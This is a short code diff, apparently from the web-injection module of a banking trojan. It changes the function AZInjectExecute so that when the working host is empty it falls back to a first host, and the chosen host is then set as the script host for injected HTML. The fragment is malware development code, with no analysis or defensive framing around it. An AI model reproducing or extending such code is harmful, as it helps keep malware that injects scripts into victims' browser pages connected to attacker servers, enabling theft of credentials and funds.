@@ -124,6 +124,8 @@ void AZInjectExecute(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
 	if (Config && AZDATA::Checker)
 	{
 		string Host = AZDATA::Checker->GetWorkHost();
+		if (Host.IsEmpty())
+			Host = AZDATA::Checker->FirstHost;
 		Config->HTMLInjects->Variables->SetValue(AZDATA::Variable_ScriptHost, Host);
 	}
 }
